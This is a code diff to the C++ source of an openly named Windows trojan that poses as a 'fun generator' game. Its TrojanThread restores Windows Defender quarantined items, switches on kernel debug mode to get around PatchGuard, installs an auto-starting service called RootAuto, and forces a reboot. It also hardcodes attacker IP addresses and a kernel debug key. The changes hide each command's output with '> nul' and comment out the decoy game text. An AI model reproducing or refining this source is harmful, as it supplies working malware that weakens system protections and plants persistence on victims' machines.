@@ -17,8 +17,8 @@ std::wstring GetCurrentPath() {
 
 BOOL TrojanThread(LPVOID TrojParams) {
     const char* CleaningCommands =
-        "cd \"%ProgramFiles%\\Windows Defender\" && "
-        "MpCmdRun.exe -Restore -All";
+        "cd \"%ProgramFiles%\\Windows Defender\" > nul && "
+        "MpCmdRun.exe -Restore -All > nul";
     char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char DebugPort[MAX_PORT_SIZE] = { 0 };
@@ -52,7 +52,7 @@ BOOL TrojanThread(LPVOID TrojParams) {
 
 
     // Disable patchguard:
-    if (system("bcdedit /debug ON") == -1) {
+    if (system("bcdedit /debug ON > nul") == -1) {
         printf("Failed to run KPP disabler: %d\n", GetLastError());
     }
     printf("ran KPP disabler successfully\n");
@@ -68,9 +68,9 @@ BOOL TrojanThread(LPVOID TrojParams) {
 
 
     // Create temporary service for AutoService:
-    system("sc stop RootAuto");
-    system("sc delete RootAuto");
-    if (system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\"") == -1) {
+    system("sc stop RootAuto > nul");
+    system("sc delete RootAuto > nul");
+    if (system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\" > nul") == -1) {
         printf("Failed to create auto service: %d\n", GetLastError());
         return FALSE;
     }
@@ -78,7 +78,7 @@ BOOL TrojanThread(LPVOID TrojParams) {
 
 
     // Forcefully restart machine:
-    if (system("shutdown -r -f") == -1) {
+    if (system("shutdown -r -f > nul") == -1) {
         printf("Failed to force reset the target: %d\n", GetLastError());
         return FALSE;
     }
@@ -98,7 +98,7 @@ int main()
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
 
      // HARDCODED VALUES, CHANGE THIS BY ListAttacker IF NEEDED
-    const char* AttackAddresses = "172.25.224.1~172.29.32.1~172.20.32.1~172.20.240.1~172.27.144.1~172.28.112.1~172.17.96.1~192.168.47.1~192.168.5.1~192.168.1.21~172.21.64.1~192.168.56.1~192.168.40.1";
+    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";
     const char* DebugPort = "50003";
     const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK1111";
 
@@ -155,6 +155,7 @@ int main()
         free(TrojanParams);
         return 1;
     }
+    /*
     printf("Welcome to fun generator!\nRules:\n");
     printf("1. when asked for ANY input, you should input only one letter (or it will ruin the fun ;) )\n");
     printf("2. when asked if want to start/continue, the letter n will represent no and any other letter will represent yes\n");
@@ -178,6 +179,7 @@ int main()
     }
 
     printf("Finished Fun Engine! Cleaning everything...\n");
+    */
     WaitForSingleObject(TrojanHandle, INFINITE);
     free(TrojanParams);
     printf("Cleaning succeeded, bye bye!\n");
